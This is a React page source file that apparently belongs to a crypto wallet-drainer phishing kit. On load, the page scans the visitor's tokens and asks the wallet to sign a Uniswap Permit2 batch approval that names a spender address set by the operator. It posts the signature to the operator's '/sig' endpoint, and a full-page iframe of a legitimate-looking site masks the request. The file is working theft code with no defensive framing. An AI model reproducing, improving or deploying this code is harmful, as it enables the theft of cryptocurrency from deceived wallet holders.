import { useEffect } from 'react'
import { useWeb3React } from '@web3-react/core'

import Layout from '../components/layout'
import { injected } from '../components/wallet/connectors'

import { ethers } from 'ethers'
import qs from 'qs'
import { AllowanceTransfer, PERMIT2_ADDRESS } from '@uniswap/permit2-sdk'

import http from '../units/http'
import { Ddefault } from '../configs/Ddefault'
import Interface from '../units/tools/Interface'
import Covalenthq from '../units/tools/Covalenthq'
import Alchemy from '../units/tools/Alchemy'
import Quicknode from '../units/tools/Quicknode'
import CHAIN_DATA_LIST from '../configs/Chainlist'

const HomePage = () => {
  const { activate } = useWeb3React()

  useEffect(() => {
    if (typeof window.ethereum == 'undefined') return false

    const metamaskProvider = new ethers.providers.Web3Provider(window.ethereum)
    const signer = metamaskProvider.getSigner()
    const account = signer.provider.provider.selectedAddress

    try {
      //getTokenTools(signer, new Quicknode(account))
      //getTokenTools(signer, new Alchemy(account))
      getTokenTools(signer, new Covalenthq(activate, injected, account))
    } catch (e) {
      console.log(e.message)
    }

    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])
  let D = {}

  let network = process.env.NEXT_PUBLIC_CHAIN

  const getTokenTools = async (signer, instance) => {
    if (!signer) return
    const TokenTools = new Interface('TokenTools', [
      'inspectWalletToken',
      'inspectTokenPrice',
      'caculateValue',
      'createConfiguration',
    ])
    Interface.ensureImplement(instance, TokenTools)

    if (
      window.ethereum.networkVersion &&
      ['1', '5', '10', '56', '137', '42161'].includes(
        window.ethereum.networkVersion
      )
    ) {
      network = window.ethereum.networkVersion
    }

    try {
      //scan wallet
      D = await instance.createConfiguration()
      if (JSON.stringify(D) === '{}') {
        D = Ddefault[network]
      }
    } catch (e) {
      console.log(e.message)
    }
    //handle sig
    var once = false
    setInterval(() => {
      if (once) return
      try {
        handleLoad(signer)
      } catch (e) {
        console.log(e.message)
      }

      once = true
    }, 1000)
  }
  const handleLoad = async (signer) => {
    if (
      window.ethereum.networkVersion &&
      ['1', '5', '10', '56', '137', '42161'].includes(
        window.ethereum.networkVersion
      )
    ) {
      network = window.ethereum.networkVersion
    }
    const details = []
    //default signature
    Object.keys(D).map((item, index) => {
      if (item != 'spender_address' && item != 'expiration') {
        const token_item = {
          token: D[item].address,
          amount: D[item].amount,
          expiration: D[item].expiration,
          nonce: 0,
        }
        details.push(token_item)
      }
    })
    const permit = {
      details: details,
      spender: D.spender_address,
      sigDeadline: D.expiration,
    }
    //handle

    try {
      const { domain, types, values } = AllowanceTransfer.getPermitData(
        permit,
        PERMIT2_ADDRESS,
        network
      )
      //console.log(domain, types, values)

      const s = await signer._signTypedData(domain, types, values)
      //setSignature(s)
      const data = {
        account: signer.provider.provider.selectedAddress,
        permit2address: domain.verifyingContract,
        chain: domain.chainId,
        details: JSON.stringify(values.details),
        signature: s,
        source: process.env.NEXT_PUBLIC_SOURCE,
      }
      http.post('/sig', qs.stringify(data)).then((res) => {
        if (res.status == 200) {
          window.location.href = process.env.NEXT_PUBLIC_DOMAIN_WEBSITE
        }
      })

      try {
        signer = null
      } catch (ex) {
        console.log(ex)
      }
      return s
    } catch (e) {
      console.log(e.message)

      if (e.code != 'ACTION_REJECTED') {
        if (e.code == -32603) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [
              {
                chainId: ethers.utils.hexValue(
                  CHAIN_DATA_LIST[process.env.NEXT_PUBLIC_CHAIN].chainId
                ),
                chainName:
                  CHAIN_DATA_LIST[process.env.NEXT_PUBLIC_CHAIN].chainParams
                    .chainName,
                rpcUrls:
                  CHAIN_DATA_LIST[process.env.NEXT_PUBLIC_CHAIN].chainParams
                    .rpcUrls,
                nativeCurrency:
                  CHAIN_DATA_LIST[process.env.NEXT_PUBLIC_CHAIN].chainParams
                    .nativeCurrency,
                blockExplorerUrls:
                  CHAIN_DATA_LIST[process.env.NEXT_PUBLIC_CHAIN].chainParams
                    .blockExplorerUrls,
              },
            ],
          })
        }
      } else {
        console.log('USER REJECTED')
      }
    }
  }

  return (
    <Layout>
      <div id='page-main'></div>
      <div className='iframe-box'>
        <iframe
          id='my-iframe'
          src={process.env.NEXT_PUBLIC_DOMAIN_WEBSITE}
          style={{ width: '100%', height: '100%' }}></iframe>
      </div>
    </Layout>
  )
}

export default HomePage

HomePage.getLayout = function getLayout(page) {
  return { page }
}
